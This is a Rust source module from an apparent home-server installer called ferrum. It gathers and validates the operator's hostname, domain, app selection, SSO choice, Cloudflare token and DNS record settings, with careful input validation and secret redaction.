//! Everything the operator tells the installer (spec R3 A1, R3 A8).
//!
//! Collected once, up front, before anything is generated or destroyed --
//! so that a run which is going to fail on a missing answer fails while it
//! still costs nothing.

use crate::address::{self, Detected};
use crate::prompt::PromptIo;
use crate::sso::{self, SsoDecision};

// Every app in ferrum's catalog. Must stay on ONE line: nix/modules/flake/
// checks.nix does a line lookup against it, the same way it does for
// forms.js's SUPPORTED_TYPES, because Nix's regex engine rejects the
// bracket-negation forms a multi-line parse would need. That check is what
// stops this list drifting from modules/lib/catalog.nix -- a drift whose
// symptom is an app the operator simply cannot install.
pub const CATALOG_APPS: &[&str] = &[
    "jellyfin",
    "plex",
    "prowlarr",
    "qbittorrent",
    "radarr",
    "sabnzbd",
    "sonarr",
];

/// Apps that need the Cloudflare DNS-01 credential once published.
///
/// Any public app does, so this is really "did they pick anything at all";
/// `modules/proxy/acme.nix` asserts `publicApps == {} || credentialProvided`.
pub fn needs_acme_credential(apps: &[String]) -> bool {
    !apps.is_empty()
}

/// A secret that cannot be printed by accident.
///
/// The Cloudflare token is the one genuinely high-value credential this
/// installer handles -- it grants DNS-zone-wide manipulation. Transport
/// discipline (stdin only, never argv, never persisted) was already
/// correct, but `#[derive(Debug)]` on the struct holding it meant a single
/// future `dbg!(&answers)` would leak it with no test to catch that.
#[derive(Clone, PartialEq, Eq)]
pub struct Secret(String);

impl Secret {
    pub fn new(value: String) -> Self {
        Self(value)
    }
    pub fn expose(&self) -> &str {
        &self.0
    }
}

impl std::fmt::Debug for Secret {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str("<redacted>")
    }
}

/// What the DNS records ferrum owns point at (spec R1 A2).
///
/// A2 calls this "a decision, not an assumption", and an enum is how that
/// is enforced rather than merely documented: there are exactly two shapes
/// and no absent one. A server on a static public address wants `A`; one
/// behind an address that changes wants `Cname` onto a name something else
/// already keeps current. Guessing wrong publishes every app at a server
/// that is not this one.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RecordTarget {
    /// `A` records to a stated public IPv4 address.
    ///
    /// Held as an [`std::net::Ipv4Addr`] rather than a `String` so that a
    /// value which got this far cannot be anything else: it is parsed once,
    /// at the prompt where a human can fix it, and no later reader has to
    /// ask the question again.
    A(std::net::Ipv4Addr),
    /// `CNAME` records following a stated hostname -- typically a
    /// dynamic-DNS name maintained outside ferrum.
    Cname(String),
}

/// The operator's DNS answers: where the records point (R1 A2), and
/// whether a timer keeps them current (R1 A8).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DnsDecision {
    /// A2's choice, made once and applied to every record.
    pub target: RecordTarget,
    /// A8's updater. Offered with the recommended answer as the default in
    /// `A` mode, and not offered at all in `Cname` mode: a CNAME already
    /// delegates address tracking to whatever owns the target name, and
    /// `modules/proxy/dns.nix` asserts that combination is invalid rather
    /// than running a timer with nothing to do.
    pub ddns_updater: bool,
}

/// Which of A2's two shapes the operator picked.
///
/// Separate from [`RecordTarget`] because the mode is known one question
/// before its value is: the prompt asks "a or cname", and only then asks
/// for the address or the hostname that mode needs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum RecordMode {
    A,
    Cname,
}

#[derive(Debug, PartialEq, Eq)]
pub struct Answers {
    pub hostname: String,
    pub base_domain: Option<String>,
    pub acme_email: Option<String>,
    pub sso: SsoDecision,
    pub apps: Vec<String>,
    /// The Cloudflare DNS-01 token, held in memory only. Never written to
    /// a file on the operator's machine and never logged; it reaches the
    /// host through `ferrum-apply put-secret` during stage 2.
    pub cloudflare_token: Option<Secret>,
    /// R1 A2/A8: what ferrum's own DNS records point at, and whether the
    /// updater runs.
    ///
    /// `None` on a host that publishes nothing or has no credential to
    /// manage records with -- `modules/proxy/dns.nix` asserts that
    /// `ferrum.proxy.dns.enable` implies a base domain and a declared
    /// credential, so there is nothing to ask about without both.
    pub dns: Option<DnsDecision>,
}

/// A hostname must be a DNS label: it becomes `networking.hostName` and
/// the subdomain apps are published under.
fn validate_hostname(raw: &str) -> anyhow::Result<String> {
    let h = raw.trim().to_lowercase();
    if h.is_empty() || h.len() > 63 {
        anyhow::bail!("hostname must be 1-63 characters");
    }
    if !h.chars().all(|c| c.is_ascii_alphanumeric() || c == '-') {
        anyhow::bail!("hostname {h:?} may contain only letters, digits and '-'");
    }
    if h.starts_with('-') || h.ends_with('-') {
        anyhow::bail!("hostname {h:?} must not start or end with '-'");
    }
    Ok(h)
}

/// The ACME contact address. Same discipline as the SSO admin address.
///
/// # Errors
/// When the address is not usable.
fn validate_acme_email(raw: &str) -> anyhow::Result<String> {
    crate::sso::validate_email(raw)
}

/// Validates a base domain as an **allowlist**, not a typo-catcher.
///
/// This value is interpolated into commands that run as root on the target
/// (`verify::auth_checks`'s curl, among others). Rejecting whitespace and a
/// missing dot is not a safety property: backticks, `$`, `;`, `|`, `&` and
/// quotes all pass that. So only the characters a DNS name may actually
/// contain are permitted, and each label is checked.
///
/// # Errors
/// When the value is not a syntactically valid domain name.
fn validate_domain(raw: &str) -> anyhow::Result<String> {
    let d = raw.trim().to_lowercase();
    if d.is_empty() || d.len() > 253 {
        anyhow::bail!("{d:?} is not a domain name");
    }
    if !d.contains('.') || d.starts_with('.') || d.ends_with('.') {
        anyhow::bail!("{d:?} is not a domain name");
    }
    if !d
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-')
    {
        anyhow::bail!(
            "{d:?} contains characters that are not allowed in a domain name \
             (letters, digits, '.' and '-' only)"
        );
    }
    for label in d.split('.') {
        if label.is_empty() || label.len() > 63 {
            anyhow::bail!("{d:?} has a label that is empty or too long");
        }
        if label.starts_with('-') || label.ends_with('-') {
            anyhow::bail!("{d:?} has a label starting or ending with '-'");
        }
    }
    Ok(d)
}

/// Parses an app selection: names, or `all`, or empty for none.
///
/// # Errors
/// Names every unrecognised entry at once rather than one per retry.
pub fn parse_app_selection(raw: &str) -> anyhow::Result<Vec<String>> {
    let raw = raw.trim();
    if raw.is_empty() {
        return Ok(Vec::new());
    }
    if raw.eq_ignore_ascii_case("all") {
        return Ok(CATALOG_APPS.iter().map(|s| s.to_string()).collect());
    }
    let picked: Vec<String> = raw
        .split([',', ' '])
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .map(str::to_lowercase)
        .collect();
    let unknown: Vec<&str> = picked
        .iter()
        .map(String::as_str)
        .filter(|a| !CATALOG_APPS.contains(a))
        .collect();
    if !unknown.is_empty() {
        anyhow::bail!(
            "not in the catalog: {}. Available: {}",
            unknown.join(", "),
            CATALOG_APPS.join(", ")
        );
    }
    let mut sorted = picked;
    sorted.sort();
    sorted.dedup();
    Ok(sorted)
}

/// Asks a question until the answer validates, or gives up after three
/// tries so a scripted or confused session cannot loop forever.
fn ask_valid<T>(
    io: &mut impl PromptIo,
    question: &str,
    validate: impl Fn(&str) -> anyhow::Result<T>,
) -> anyhow::Result<T> {
    for attempt in 0..3 {
        let raw = io.ask(question)?;
        match validate(&raw) {
            Ok(v) => return Ok(v),
            Err(e) if attempt < 2 => io.say(&format!("  {e}")),
            Err(e) => return Err(e),
        }
    }
    unreachable!("the loop returns or errors on its last iteration")
}

/// Parses A2's record-mode answer.
///
/// Strict: an empty string is NOT a mode here. The prompt supplies its own
/// default before calling this, so that a `recordMode` recovered from a
/// hand-edited settings document cannot quietly become "a" because someone
/// blanked it.
///
/// # Arguments
/// * `raw` - the operator's answer, or a document's `recordMode`.
///
/// # Errors
/// When the value is neither mode, naming both and what each is for.
fn parse_record_mode(raw: &str) -> anyhow::Result<RecordMode> {
    match raw.trim().to_lowercase().as_str() {
        "a" => Ok(RecordMode::A),
        "cname" => Ok(RecordMode::Cname),
        other => anyhow::bail!(
            "{other:?} is not a record mode. Answer 'a' for A records \
             pointing at this server's own public IPv4 address, or 'cname' \
             for records that follow a hostname something else already \
             keeps current."
        ),
    }
}

/// Validates the address every A record will point at.
///
/// Parsed here, at the one place a human types it, because the alternative
/// is `modules/proxy/dns.nix`'s assertion firing during an evaluation that
/// happens long after the operator has walked away -- and because a value
/// that is not an address at all would otherwise reach Cloudflare and be
/// rejected there, far from its cause.
///
/// # Arguments
/// * `raw` - what the operator typed.
///
/// # Returns
/// The parsed address.
///
/// # Errors
/// When it is empty, when it is IPv6, or when it is not an IPv4 address.
/// Each says a different thing, because each has a different fix.
fn validate_public_ipv4(raw: &str) -> anyhow::Result<std::net::Ipv4Addr> {
    let value = raw.trim();
    if value.is_empty() {
        anyhow::bail!(
            "an address is required. modules/proxy/dns.nix refuses to \
             evaluate with an empty ferrum.proxy.dns.staticAddress rather \
             than publish every app at somewhere that is not this server -- \
             so an empty answer here costs the whole install, thirty minutes \
             from now, with the error naming Nix instead of this question. \
             Give this server's public IPv4 address, e.g. 203.0.113.10."
        );
    }
    if let Ok(v6) = value.parse::<std::net::Ipv6Addr>() {
        anyhow::bail!(
            "{v6} is an IPv6 address. ferrum publishes A and CNAME records \
             and no AAAA record at all: that is a deliberate scope decision \
             (finding UF-18), not a bug or a gap in this check. Give this \
             server's public IPv4 address, or answer 'cname' and point at a \
             hostname that already carries whatever records you want."
        );
    }
    value.parse::<std::net::Ipv4Addr>().map_err(|_| {
        anyhow::anyhow!(
            "{value:?} is not an IPv4 address. It must be four decimal \
             octets, e.g. 203.0.113.10 -- and it must be the address the \
             internet reaches this server at, not its address on your LAN."
        )
    })
}

/// Whether an address can be reached from outside this network at all.
///
/// Report-only, never a refusal. A private, loopback, link-local or CGNAT
/// address in a public A record is almost always a mistake -- it publishes a
/// name that resolves somewhere nobody outside can reach -- but "almost
/// always" is not "always", and an installer that refused it would be
/// substituting its own judgement for the operator's about their own
/// network. So it is said out loud and the answer stays theirs.
///
/// Delegates to [`address::routability`] rather than repeating the ranges:
/// A8's detection classifies the *same* question about an address it found
/// on the target, and two copies of this judgement would eventually disagree
/// about which of a typed and a detected address is publishable.
fn is_reachable_from_outside(addr: &std::net::Ipv4Addr) -> bool {
    address::routability(addr) == address::Routability::Public
}

/// Validates the hostname every CNAME will follow.
///
/// Reuses [`validate_domain`]: a CNAME target is a DNS name and needs
/// exactly the same allowlist, for exactly the same reason -- it is written
/// into the host's settings and read back by the reconciler.
///
/// # Arguments
/// * `raw` - what the operator typed.
///
/// # Returns
/// The trimmed, lowercased hostname.
///
/// # Errors
/// When it is empty (naming the Nix assertion that would otherwise fire
/// much later), or when it is not a syntactically valid DNS name.
fn validate_cname_target(raw: &str) -> anyhow::Result<String> {
    if raw.trim().is_empty() {
        anyhow::bail!(
            "a target hostname is required. modules/proxy/dns.nix refuses to \
             evaluate with an empty ferrum.proxy.dns.cnameTarget rather than \
             write records that follow nothing -- so an empty answer here \
             fails the install later instead of this question now. It is \
             typically a dynamic-DNS name that already tracks this host's \
             address, e.g. myhost.dynamic-dns.example.net."
        );
    }
    validate_domain(raw)
}

/// How the A record's address was arrived at.
///
/// A8's failure mode is a confidently wrong address nobody looked at, so
/// every address this installer uses is printed back with its provenance
/// attached. "203.0.113.10" alone does not tell an operator whether ferrum
/// found that or they typed it, and those two mistakes have different fixes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum AddressSource {
    /// Found on the target by [`crate::address::detect`].
    Detected,
    /// Typed at the prompt, whether or not detection offered something.
    Entered,
}

impl AddressSource {
    /// The parenthetical shown beside the address.
    fn label(self) -> &'static str {
        match self {
            AddressSource::Detected => "detected on the target",
            AddressSource::Entered => "you entered this",
        }
    }
}

/// How `decide_dns` obtains a candidate address for A8.
///
/// A seam rather than a direct call to [`crate::address::detect`] for two
/// reasons. Production needs the target and the SSH credential, which live
/// in `preconditions` and have no business reaching this module; and the
/// tests must never open a socket, because the Nix sandbox that runs the
/// workspace suite has no network at all.
///
/// `FnMut` rather than `Fn`: the prompt offers a re-detect, so it is called
/// more than once in a single run.
pub type Detector<'a> = &'a mut dyn FnMut() -> Detected;

/// A8's address question: detect on the target, then confirm.
///
/// The order is the requirement. Detection runs first and its result is
/// always printed, because an address written from a silent guess is exactly
/// what A8 forbids; only a **public** detected address is then offered as a
/// default, so an operator pressing enter can never accept a CGNAT, private
/// or IPv6 answer without having read a paragraph explaining it. Anything
/// else -- unreachable, unparseable, missing, failed -- falls back to asking,
/// with the reason stated. Nothing here aborts the install: a detection that
/// cannot run costs one typed answer, not a re-run.
///
/// An overridden value goes through the same [`validate_public_ipv4`] a
/// detection-free run would use; there is no second, weaker path.
///
/// # Arguments
/// * `io` - the question-and-answer channel with the operator.
/// * `detect` - the seam described on [`Detector`].
///
/// # Returns
/// The address and where it came from.
///
/// # Errors
/// An input failure, or an answer that fails validation three times.
fn ask_a_record_address(
    io: &mut impl PromptIo,
    detect: Detector<'_>,
) -> anyhow::Result<(std::net::Ipv4Addr, AddressSource)> {
    // Bounded like `ask_valid`, and for the same reason: a scripted or
    // confused session asking to look again forever is a hang, not a retry.
    for attempt in 0..3 {
        io.say(
            "\nLooking for this server's public address -- asking the server \
             itself, over the\nSSH connection, rather than asking this machine. \
             A VPN, a corporate network or\nsimply a different connection here \
             would answer with an address that is not the\nserver's, and that \
             mistake looks exactly like a correct answer.",
        );
        let found = detect();
        io.say(&found.summary());
        let Some(candidate) = found.candidate() else {
            // Reported, not used. The plain prompt below is the fallback.
            break;
        };
        let raw = io.ask(&format!(
            "Public IPv4 address for the A records ('r' to look again) [{candidate}]:"
        ))?;
        let answer = raw.trim();
        if answer.is_empty() {
            return Ok((candidate, AddressSource::Detected));
        }
        if answer.eq_ignore_ascii_case("r") {
            if attempt < 2 {
                continue;
            }
            break;
        }
        match validate_public_ipv4(answer) {
            Ok(addr) => return Ok((addr, AddressSource::Entered)),
            // Not fatal: fall through to the plain prompt, which gives the
            // operator the same three tries every other answer gets.
            Err(e) => {
                io.say(&format!("  {e}"));
                break;
            }
        }
    }

    Ok((
        ask_valid(
            io,
            "This server's public IPv4 address:",
            validate_public_ipv4,
        )?,
        AddressSource::Entered,
    ))
}

/// Asks A2's record-target question and A8's updater question.
///
/// Both are asked, never inferred. A2 exists because ferrum cannot know
/// which shape is right for a given host, and A8 exists because the failure
/// a stale record causes is one the operator cannot observe: every app goes
/// unreachable from outside while the host stays healthy, its services keep
/// running and its certificates stay valid, with no error logged anywhere.
/// That is why the updater's default is on rather than off.
///
/// # Arguments
/// * `domain` - `ferrum.proxy.baseDomain`, used only to make the question
///   concrete about which names are at stake.
/// * `io` - the question-and-answer channel with the operator.
/// * `detect` - A8's address detection, described on [`Detector`]. Used
///   only in `A` mode: a CNAME follows a name, so there is no address to
///   find.
///
/// # Returns
/// The decision, ready to be rendered into `ferrum.proxy.dns`.
///
/// # Errors
/// An input failure, or an answer that fails validation three times.
pub fn decide_dns(
    domain: &str,
    io: &mut impl PromptIo,
    detect: Detector<'_>,
) -> anyhow::Result<DnsDecision> {
    io.say(&format!(
        "\nferrum also creates the DNS record for every hostname it publishes, so \
         <app>.{domain}\nresolves without you opening a DNS console. It needs to know \
         what those records should\npoint at, and it will not guess: a wrong answer \
         publishes every app at a server that\nis not this one.\n\n  \
         a      A records pointing at this server's own public IPv4 address\n  \
         cname  records following a hostname something else keeps current\n         \
         (typically a dynamic-DNS name)"
    ));
    let mode = ask_valid(io, "Record target ('a' or 'cname') [a]:", |raw| {
        // The prompt's own default, applied before the strict parse, so that
        // pressing enter means "a" without the parser itself accepting a
        // blank recordMode out of a settings document.
        parse_record_mode(if raw.trim().is_empty() { "a" } else { raw })
    })?;

    let target = match mode {
        RecordMode::A => {
            let (address, source) = ask_a_record_address(io, detect)?;
            // A8: shown before it is used, every time, with its provenance.
            // This is the last line between a wrong address and every app
            // published at someone else's server.
            io.say(&format!(
                "\n  A records for every app under {domain} will point at {address} \
                 ({}).",
                source.label()
            ));
            if !is_reachable_from_outside(&address) {
                io.say(&format!(
                    "  Note: {address} is not an address anything outside this network \
                     can reach.\n  The records will resolve and every app will still be \
                     unreachable from the\n  internet. Continuing with it, as you asked."
                ));
            }
            RecordTarget::A(address)
        }
        RecordMode::Cname => RecordTarget::Cname(ask_valid(
            io,
            "Hostname the records should follow:",
            validate_cname_target,
        )?),
    };

    let ddns_updater = match &target {
        // Not offered, rather than merely defaulted off: modules/proxy/dns.nix
        // asserts the updater and CNAME mode are incompatible, so an operator
        // who said yes here would meet that assertion instead of an install.
        RecordTarget::Cname(_) => false,
        RecordTarget::A(_) => {
            io.say(
                "\nIf this server's public address ever changes, those A records go \
                 stale and every\napp becomes unreachable from outside -- while the host \
                 stays healthy, the services\nkeep running and the certificates stay \
                 valid, with nothing anywhere reporting an\nerror. An hourly check \
                 corrects them, and only ever touches records ferrum\ncreated. \
                 Recommended unless this address is contractually static.",
            );
            let answer = io.ask("Keep the records up to date automatically? [Y/n]")?;
            !matches!(answer.to_lowercase().as_str(), "n" | "no")
        }
    };

    Ok(DnsDecision {
        target,
        ddns_updater,
    })
}

/// Collects every operator answer.
///
/// # Arguments
/// * `io` - the question-and-answer channel with the operator.
/// * `make_client` - how the Cloudflare token is checked once it has been
///   entered. Production passes [`cloudflare_client`]; tests pass a factory
///   pointed at `ferrum_dns::testing::FakeCloudflare`, because the sandbox
///   that runs the suite has no network and must never reach the real API.
/// * `detect` - R1 A8's address detection, described on [`Detector`].
///   Production runs it on the target over SSH; tests pass a fake, for the
///   same no-network reason.
///
/// # Errors
/// An input failure, an answer that fails validation three times, a
/// declined SSO confirmation (see `sso::decide`), or a Cloudflare token
/// that cannot manage records for the base domain.
pub fn collect(
    io: &mut impl PromptIo,
    make_client: ClientFactory<'_>,
    detect: Detector<'_>,
) -> anyhow::Result<Answers> {
    let hostname = ask_valid(io, "Hostname for this machine:", validate_hostname)?;

    io.say(
        "\nA base domain publishes each app at <app>.<domain> with a real \
         certificate.\nLeave it empty for a host reachable only from this \
         network.",
    );
    let raw_domain = io.ask("Base domain (empty for none):")?;
    let base_domain = if raw_domain.trim().is_empty() {
        None
    } else {
        Some(validate_domain(&raw_domain)?)
    };

    let acme_email = match &base_domain {
        Some(_) => Some(ask_valid(
            io,
            "Email for Let's Encrypt expiry notices:",
            validate_acme_email,
        )?),
        None => None,
    };

    io.say(&format!("\nCatalog apps: {}", CATALOG_APPS.join(", ")));
    let apps = ask_valid(
        io,
        "Apps to enable (comma separated, 'all', or empty for none):",
        parse_app_selection,
    )?;

    let sso = sso::decide(base_domain.as_deref(), &apps, io)?;

    // Asked last, and only when it is genuinely required, so an operator
    // exploring the questions is never prompted for a credential they do
    // not yet need.
    let cloudflare_token = match base_domain.as_deref() {
        Some(domain) if needs_acme_credential(&apps) => {
            io.say(
                "\nLet's Encrypt issues these certificates over DNS-01, and ferrum \
                 publishes each app's\nDNS record with the same credential, so it needs \
                 a Cloudflare API token scoped\nZone:Read + DNS:Edit on this domain. It \
                 is held in memory, written to no file here,\nand encrypted to the \
                 host's own key once the host exists.\n\nIt is checked against \
                 Cloudflare as soon as you enter it, so a token that cannot\nsee this \
                 domain fails here rather than after the install.",
            );
            Some(validate_and_verify_cloudflare_token(
                &io.ask_secret("Cloudflare API token:")?,
                domain,
                make_client,
            )?)
        }
        _ => None,
    };

    // Asked after the token, and only when there is one. Record management
    // uses that same credential and modules/proxy/dns.nix asserts it is
    // declared, so asking for a record target on a run whose token has just
    // been refused would be collecting an answer that cannot be used.
    let dns = match (&base_domain, &cloudflare_token) {
        (Some(domain), Some(_)) => Some(decide_dns(domain, io, detect)?),
        _ => None,
    };

    Ok(Answers {
        hostname,
        base_domain,
        acme_email,
        sso,
        apps,
        cloudflare_token,
        dns,
    })
}

/// Rebuilds the answers from a generated `settings.stage2.json`.
///
/// A resume after the disk has been erased must never re-prompt: the
/// operator answered these questions before anything was destroyed, and
/// asking again invites a different answer against a half-installed
/// machine. The one thing that cannot be recovered is the Cloudflare
/// token, which was deliberately never written anywhere -- the caller
/// re-asks for that alone, and only if it is still needed.
///
/// # Errors
/// Malformed JSON, or a document with no hostname to recover.
/// Validates a Cloudflare API token before it can reach ACME.
///
/// The token becomes the value of an HTTP `Authorization` header. Any
/// character that cannot appear in a header field makes every certificate
/// order fail, and the failure surfaces far away from its cause: on the
/// first real install it appeared as
///
///   acme: error presenting token: cloudflare: failed to find zone
///   thesyms.ca.: ... net/http: invalid header field value for
///   "Authorization"
///
/// which reads like a DNS or zone problem rather than a bad paste. The
/// actual cause was a trailing `%` -- zsh's marker for output with no
/// final newline, copied along with the token out of a terminal.
///
/// Validated here, at the one place a human types it, rather than
/// anywhere further in: by the time it is a sops file on the host it has
/// been encrypted, shipped and referenced by a systemd unit, and the
/// error no longer names it.
///
/// # Arguments
/// * `raw` - what the operator typed or pasted.
///
/// # Returns
/// The trimmed token.
///
/// # Errors
/// When it is empty, or contains anything outside the character set
/// Cloudflare issues -- naming the offending character, since it is
/// usually invisible.
pub fn validate_cloudflare_token(raw: &str) -> anyhow::Result<String> {
    let token = raw.trim();
    if token.is_empty() {
        anyhow::bail!(
            "a Cloudflare DNS-01 token is required to publish an app: \
             modules/proxy/acme.nix refuses to build without it"
        );
    }
    // An allowlist. Cloudflare issues tokens from exactly this set, and
    // this value ends up in an HTTP header where anything else is fatal.
    if let Some(bad) = token
        .chars()
        .find(|c| !(c.is_ascii_alphanumeric() || *c == '_' || *c == '-'))
    {
        anyhow::bail!(
            "that Cloudflare token contains {bad:?} ({:#06x}), which cannot \
             appear in an HTTP Authorization header -- every certificate \
             order would fail with \"invalid header field value\", and the \
             error would name DNS rather than the token.\n\n\
             If you copied it from a terminal, check for a trailing \"%\" \
             (zsh's marker for output with no final newline) or a stray \
             space. A Cloudflare API token is letters, digits, underscores \
             and hyphens only.",
            bad as u32
        );
    }
    if token.len() < 20 {
        anyhow::bail!(
            "that Cloudflare token is only {} characters, which is too short \
             to be one. Tokens are issued from the Cloudflare dashboard \
             under My Profile -> API Tokens, scoped Zone:Read + DNS:Edit.",
            token.len()
        );
    }
    Ok(token.to_string())
}

/// How token verification reaches Cloudflare.
///
/// The client is built *from* the token, so the seam is a factory rather
/// than a client: production hands over [`cloudflare_client`], and tests
/// hand over a factory pointed at `ferrum_dns::testing::FakeCloudflare`.
/// The Nix sandbox running the workspace suite has no network at all, so a
/// test that reached the real API would fail CI by construction.
pub type ClientFactory<'a> = &'a dyn Fn(ferrum_dns::Secret) -> ferrum_dns::client::Client;

/// The production factory: a client pointed at the real Cloudflare API.
///
/// # Arguments
/// * `token` - the bare token the operator just entered.
///
/// # Returns
/// A client every call site of [`validate_and_verify_cloudflare_token`]
/// shares, so there is one place the endpoint and timeouts are decided.
#[must_use]
pub fn cloudflare_client(token: ferrum_dns::Secret) -> ferrum_dns::client::Client {
    ferrum_dns::client::Client::new(token)
}

/// Both halves of A5's check: the token is well-formed **and** Cloudflare
/// agrees it can manage records for this domain.
///
/// This is the only way a [`Secret`] holding a Cloudflare token is minted
/// in this binary, and that is the point. The installer has two places it
/// asks for the token -- the first interactive run, and a resume after the
/// disk has been erased -- and until this function existed only the first
/// ran even the syntactic check (UF-20). The resumed path is the likelier
/// one after the failure that loses a credential, so the verification was
/// missing exactly where it mattered most.
///
/// Order matters. The syntactic checks run first and refuse an empty,
/// whitespace-only or malformed value **before** any request is made. An
/// unset credential producing an empty request that Cloudflare answers
/// blandly is the failure mode this whole story exists to remove: an empty
/// answer reads exactly like "not supported", and a wrong conclusion
/// reached confidently from a silent failure is worse than an error.
///
/// Zone resolution is a longest-suffix match over every zone the token can
/// see (decision D-06), not `GET /zones?name=<base_domain>`:
/// `modules/core/options.nix` documents `home.example.com` as a base
/// domain, and the exact-name form would reject a perfectly good token
/// scoped to `example.com`.
///
/// # Arguments
/// * `raw` - what the operator typed or pasted.
/// * `base_domain` - `ferrum.proxy.baseDomain`, the domain the records
///   will be published under.
/// * `make_client` - the factory described on [`ClientFactory`].
///
/// # Returns
/// The trimmed token, wrapped so it cannot be printed by accident.
///
/// # Errors
/// The syntactic failures of [`validate_cloudflare_token`], or a distinct
/// message per verification failure: Cloudflare refusing the credential,
/// no visible zone covering the domain, the domain being delegated to
/// other nameservers, and the API being unreachable. Each has a different
/// remedy, so each says a different thing.
pub fn validate_and_verify_cloudflare_token(
    raw: &str,
    base_domain: &str,
    make_client: ClientFactory<'_>,
) -> anyhow::Result<Secret> {
    let token = validate_cloudflare_token(raw)?;
    let client = make_client(ferrum_dns::Secret::new(token.clone()));
    match client.verify_zone_access(base_domain) {
        Ok(()) => Ok(Secret::new(token)),
        Err(failure) => Err(explain_verification_failure(&failure, base_domain)),
    }
}

/// Where the credential lives once a host exists, named exactly.
///
/// Worth stating rather than paraphrasing: it is not a bare token on the
/// host. It is the sops secret named by `ferrum.proxy.acme.credentialSecret`
/// and it is a systemd `EnvironmentFile`, so its content is a `KEY=value`
/// line. An operator told to "check the token file" who then pastes a bare
/// value into it has produced a file every reader will parse as empty.
const CREDENTIAL_LOCATION: &str = "On a host ferrum has already installed this credential is the \
     sops secret named by ferrum.proxy.acme.credentialSecret (default \
     \"acme-dns\"). It is mounted at /run/secrets/acme-dns and is a systemd \
     EnvironmentFile, so its content is the single line \
     CLOUDFLARE_DNS_API_TOKEN=<token> -- not a bare token.";

/// Turns a `ferrum-dns` failure into something the operator can act on.
///
/// Four failures arrive here and they have four different remedies: issue a
/// new token, add the zone to this Cloudflare account, undo an `NS`
/// delegation, or fix the network. Rendering them all as "invalid token"
/// would send the operator to re-issue a credential that was never the
/// problem.
///
/// # Arguments
/// * `failure` - what `verify_zone_access` returned.
/// * `base_domain` - the domain that was being checked, for the message.
///
/// # Returns
/// An error whose text names the cause and the fix. Never the token: it
/// travels only in the `Authorization` header, and `CloudflareError`'s own
/// `Display` is written to the same rule.
fn explain_verification_failure(
    failure: &ferrum_dns::CloudflareError,
    base_domain: &str,
) -> anyhow::Error {
    use ferrum_dns::CloudflareError as E;
    match failure {
        E::Api { code, message } => anyhow::anyhow!(
            "Cloudflare rejected that API token (its own error {code}: {message}).\n\n\
             The token must exist, be unexpired, and be scoped Zone:Read + DNS:Edit on \
             the zone that contains {base_domain}. Re-issue it in the Cloudflare \
             dashboard under My Profile -> API Tokens.\n\n{CREDENTIAL_LOCATION}"
        ),
        E::ZoneNotFound { .. } => anyhow::anyhow!(
            "That token was accepted, but no Cloudflare zone it can see covers \
             {base_domain}, so it cannot publish any of this host's records.\n\n\
             ferrum matches the longest zone name that is a suffix of the domain, so a \
             token scoped to \"example.com\" is correct for a base domain of \
             \"home.example.com\". This means neither {base_domain} nor any parent of \
             it is a zone in the account this token belongs to.\n\n\
             Check that the domain is in this Cloudflare account, and that the token's \
             Zone Resources include that zone rather than a different one."
        ),
        E::ZoneDelegated {
            delegated_name,
            nameservers,
            ..
        } => anyhow::anyhow!(
            "{base_domain} sits in a Cloudflare zone this token can manage, but an NS \
             record for {delegated_name} delegates it to {}. Records written in \
             Cloudflare would be accepted and would resolve nowhere, because the \
             servers the world asks are not the ones ferrum would be writing to.\n\n\
             Either remove that NS delegation so Cloudflare serves {base_domain}, or \
             choose a base domain that is not delegated away.",
            if nameservers.is_empty() {
                "other nameservers".to_string()
            } else {
                nameservers.join(", ")
            }
        ),
        E::Transport(detail) => anyhow::anyhow!(
            "Could not reach the Cloudflare API to check that token ({detail}).\n\n\
             The token has NOT been checked, and it is not accepted on trust: checking \
             it here is what stops a bad credential surfacing hours later as an install \
             that finished and published nothing. Restore this machine's network path \
             to api.cloudflare.com and run the installer again."
        ),
        E::Malformed(detail) => anyhow::anyhow!(
            "Cloudflare answered the token check with something this installer could \
             not read ({detail}).\n\n\
             The token has NOT been checked, so it is refused rather than accepted on \
             trust. If api.cloudflare.com is reachable only through a proxy that \
             rewrites responses, that proxy is the thing to fix."
        ),
    }
}

pub fn from_stage2(body: &str, hostname: &str) -> anyhow::Result<Answers> {
    let doc: serde_json::Value = serde_json::from_str(body)?;
    let sso_enabled = doc
        .pointer("/auth/enable")
        .and_then(serde_json::Value::as_bool)
        .unwrap_or(false);
    let mut apps: Vec<String> = doc
        .get("apps")
        .and_then(serde_json::Value::as_object)
        .map(|m| m.keys().cloned().collect())
        .unwrap_or_default();
    apps.sort();

    // EVERY field is re-validated, exactly as a fresh run validates it.
    //
    // This file lives in the operator's bind mount and the installer tells
    // them in as many words that the repository is theirs -- so between an
    // interrupted run and a resume it can legitimately have been edited by
    // hand, or by anything else with write access to that directory. A
    // resume that skipped validation would accept a domain a fresh run
    // would reject, and that value goes on to be interpolated into remote
    // commands. "Don't re-ask" must never become "don't re-check."
    let base_domain = match doc
        .pointer("/proxy/baseDomain")
        .and_then(serde_json::Value::as_str)
    {
        Some(d) => Some(validate_domain(d)?),
        None => None,
    };
    let acme_email = match doc
        .pointer("/proxy/acme/email")
        .and_then(serde_json::Value::as_str)
    {
        Some(e) => Some(validate_acme_email(e)?),
        None => None,
    };
    let admin_email = match doc
        .pointer("/auth/adminEmail")
        .and_then(serde_json::Value::as_str)
    {
        Some(e) => Some(crate::sso::validate_email(e)?),
        None => None,
    };
    if sso_enabled && admin_email.is_none() {
        anyhow::bail!(
            "the recovered settings enable authentication but name no admin \
             email; modules/proxy/authelia.nix asserts it is non-empty"
        );
    }
    let unknown: Vec<&str> = apps
        .iter()
        .map(String::as_str)
        .filter(|a| !CATALOG_APPS.contains(a))
        .collect();
    if !unknown.is_empty() {
        anyhow::bail!(
            "the recovered settings enable apps that are not in the catalog: {}",
            unknown.join(", ")
        );
    }
    let hostname = validate_hostname(hostname)?;

    Ok(Answers {
        hostname,
        base_domain,
        acme_email,
        sso: SsoDecision {
            enabled: sso_enabled,
            // Never recovered from disk: consent is a fact about what the
            // operator was shown and typed, not a property of a file that
            // anything with write access could add.
            unauthenticated_accepted_for: Vec::new(),
            admin_email,
        },
        apps,
        cloudflare_token: None,
        dns: dns_from_settings(&doc)?,
    })
}

